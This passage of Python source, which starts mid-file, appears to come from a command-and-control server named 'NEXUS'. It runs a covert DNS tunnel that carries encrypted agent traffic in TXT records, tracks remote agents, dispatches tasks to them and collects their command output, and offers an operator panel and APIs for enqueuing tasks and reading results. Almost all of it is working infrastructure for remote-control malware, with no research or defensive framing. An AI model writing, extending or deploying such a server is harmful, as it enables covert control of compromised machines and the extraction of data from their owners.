        log.info("DNS  tunnel listening on UDP :%d", DNS_PORT)

    def datagram_received(self, data: bytes, addr):
        asyncio.create_task(self._handle(data, addr))

    def error_received(self, exc):
        log.error("DNS socket error: %s", exc)

    async def _handle(self, data: bytes, addr):
        try:
            txid, raw = _dns_parse_query(data)
        except Exception as exc:
            log.warning("DNS parse error from %s: %s", addr, exc)
            return

        sid_len = raw[0]
        sid_raw = raw[1: 1 + sid_len].decode("ascii", errors="ignore") if sid_len else ""
        frame   = raw[1 + sid_len:]

        if not sid_raw or sid_raw not in sessions:
            if not frame or frame[0] != 0x01:
                resp_bytes = pack_clear(MSG_ERROR)
            else:
                try:
                    welcome, session_id, _, chacha, srv_nonce = \
                        server_process_hello(frame, server_priv)
                    sid_hex = session_id.hex()
                    sessions[sid_hex] = SessionState(session_id, chacha, srv_nonce)
                    log.info("DNS  HELLO session=%.16s from %s", sid_hex, addr)
                    resp_bytes = welcome
                except Exception as exc:
                    log.error("DNS HELLO error: %s", exc)
                    resp_bytes = pack_clear(MSG_ERROR)
        else:
            sess = sessions[sid_raw]
            try:
                msg_type, payload = parse_frame(frame, sess.chacha)
                sess.check_nonce(frame)
                resp = await _dispatch_encrypted(msg_type, payload, sess, sid_raw)
                resp_bytes = resp.body
            except ValueError as exc:
                log.warning("DNS REPLAY blocked session=%.8s: %s", sid_raw[:8], exc)
                resp_bytes = pack_clear(MSG_ERROR)
            except Exception as exc:
                log.error("DNS dispatch error: %s", exc)
                resp_bytes = pack_clear(MSG_ERROR)

        dns_resp = _dns_build_txt_response(txid, data, resp_bytes)
        log.info("DNS  → %d B | ← %d B from %s", len(frame), len(resp_bytes), addr)
        self._transport.sendto(dns_resp, addr)


async def _dns_server() -> None:
    loop = asyncio.get_running_loop()
    await loop.create_datagram_endpoint(
        _DnsProtocol,
        local_addr=("0.0.0.0", DNS_PORT),
    )


# ---------------------------------------------------------------------------
# Background: offline monitor
# ---------------------------------------------------------------------------

async def _monitor_agents() -> None:
    while True:
        now = time.time()
        for data in list(agents.values()):
            if now - data["last_seen"] > 30 and data["status"] == "online":
                data["status"] = "offline"
                log.warning("OFFLINE agent_id=%.8s", data["agent_id"])
        await asyncio.sleep(5)


async def _monitor_tasks() -> None:
    """Detect inflight tasks that exceeded timeout and mark them TIMEOUT."""
    while True:
        await asyncio.sleep(15)
        now = time.time()
        for agent_id, inflight_tasks in list(inflight.items()):
            for task_id, info in list(inflight_tasks.items()):
                deadline = info["dispatched_at"] + info["timeout_s"] + 10  # 10s grace
                if now > deadline:
                    del inflight_tasks[task_id]
                    if agent_id in agents:
                        agents[agent_id]["inflight_tasks"] = len(inflight_tasks)
                    log.warning("TIMEOUT task_id=%.8s agent_id=%.8s", task_id, agent_id)
                    bucket = results.setdefault(agent_id, [])
                    bucket.append({
                        "agent_id":  agent_id,
                        "task_id":   task_id,
                        "exit_code": -1,
                        "stdout":    "",
                        "stderr":    f"TIMEOUT — sin respuesta en {info['timeout_s']}s",
                        "ts":        int(now),
                    })
                    if len(bucket) > MAX_RESULTS:
                        del bucket[0]


async def _cleanup_sessions() -> None:
    """Evict sessions idle longer than SESSION_TTL to prevent memory leak."""
    while True:
        await asyncio.sleep(60)
        cutoff = time.time() - SESSION_TTL
        stale  = [sid for sid, s in sessions.items() if s.last_seen < cutoff]
        for sid in stale:
            del sessions[sid]
        if stale:
            log.info("evicted %d stale sessions", len(stale))


async def _on_startup(app: web.Application) -> None:
    global server_priv
    try:
        server_priv = load_server_key(SERVER_KEY_FILE)
        log.info("server key loaded from %s", SERVER_KEY_FILE)
    except FileNotFoundError:
        server_priv, _ = generate_server_keypair()
        save_server_key(server_priv, SERVER_KEY_FILE)
        log.info("server key generated")
    pub = get_pub_bytes(server_priv)
    try:
        with open(SERVER_PUB_FILE, "w") as f:
            f.write(pub.hex())
    except OSError as exc:
        raise RuntimeError(
            f"Cannot write {SERVER_PUB_FILE}: {exc}. Agents cannot obtain the server public key."
        ) from exc
    if not OPERATOR_API_KEY:
        log.warning("NEXUS_API_KEY not set — operator API is unauthenticated")
    log.info("server pub=%s", pub.hex())
    asyncio.create_task(_monitor_agents())
    asyncio.create_task(_monitor_tasks())
    asyncio.create_task(_cleanup_sessions())
    asyncio.create_task(_dns_server())


# ---------------------------------------------------------------------------
# App factory
# ---------------------------------------------------------------------------

def build_app() -> web.Application:
    app = web.Application(
        middlewares=[_operator_auth],
        client_max_size=1 * 1024 * 1024,  # 1 MB max request body
    )
    app.router.add_get("/",                           handle_panel)
    app.router.add_post("/",                         handle_nexus)
    app.router.add_get("/ws",                        handle_ws)
    app.router.add_get("/agents",                    api_list_agents)
    app.router.add_post("/agents/{agent_id}/task",   api_enqueue_task)
    app.router.add_get("/agents/{agent_id}/results", api_get_results)
    app.on_startup.append(_on_startup)
    return app
